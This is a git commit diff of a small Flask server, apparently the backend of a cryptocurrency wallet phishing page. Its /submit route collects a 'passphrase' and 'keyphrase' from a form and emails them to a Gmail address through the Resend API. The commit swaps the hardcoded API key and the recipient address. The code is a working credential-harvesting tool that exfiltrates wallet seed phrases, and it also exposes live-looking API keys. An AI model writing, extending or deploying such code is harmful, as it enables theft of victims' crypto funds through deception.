634f6be239d1fc6767ccac7e790a19a256d04e26
chihood247 <chibuchidavid159@gmail.com>
2025-10-08 00:12:42 +0100

    Major Changes

--- server.py
+++ server.py
@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, url_for
+from flask import Flask, request, redirect, url_for, render_template
 
 import resend
 
@@ -6,41 +6,37 @@ app = Flask(__name__)
 
 @app.route("/")
 def home():
-    return redirect(url_for("server"))
+   return redirect(url_for("server"))
 
-API_KEY = "re_KzxVfrAK_2C9BttGnpfNdoGuoiXUoC99C"
+API_KEY = "re_fEF16LKh_83fMtz7TDZNFcWXssSa8kYBs"
 
-@app.route("/submit", methods = ["GET", "POST"])
+@app.route("/submit", methods = ["POST"])
 def server():
-    if request.method == "GET":
-        return "Server Page"
-    
-    else:
-        pass_phrase = request.form.get("passphrase")
+  pass_phrase = request.form.get("passphrase")
 
-        key_phrase = request.form.get("keyphrase")
+  key_phrase = request.form.get("keyphrase")
 
-        resend.api_key = API_KEY
+  resend.api_key = API_KEY
 
-        html_message = f"""
+  html_message = f"""
 <html>
-  <body style="font-family: Arial, sans-serif;">
-    <p><strong>Passphrase:</strong> {pass_phrase}</p>
-    <p><strong>Key Phrase:</strong> {key_phrase}</p>
-    <p style="color: gray;">
-      Ignore this mail if you've not connected your wallet.
-    </p>
-  </body>
+<body style="font-family: Arial, sans-serif;">
+<p><strong>Passphrase:</strong> {pass_phrase}</p>
+<p><strong>Key Phrase:</strong> {key_phrase}</p>
+<p style="color: gray;">
+Ignore this mail if you've not connected your wallet.
+</p>
+</body>
 </html>
 """
-        response = resend.Emails.send({
-        "from": "onboarding@resend.dev",
-        "to": "zenny4114@gmail.com",
-        "subject": "New Response",
-        "html": html_message
-        })
+  response = resend.Emails.send({
+  "from": "onboarding@resend.dev",
+  "to": "snipenvm@gmail.com",
+  "subject": "New Response",
+  "html": html_message
+  })
 
-        return "Your email is on the way"
+  return render_template("submit.html")
 
 if __name__ == "__main__":
     app.run(host = "0.0.0.0", port = "10000")
